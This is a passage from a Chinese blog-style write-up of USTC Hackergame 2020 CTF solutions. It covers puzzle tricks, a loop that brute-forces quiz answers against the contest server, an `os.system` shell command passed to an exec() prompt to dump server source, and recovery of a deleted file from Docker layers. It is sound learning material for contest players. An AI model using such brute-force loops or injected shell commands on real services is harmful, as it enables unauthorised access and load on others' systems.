post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 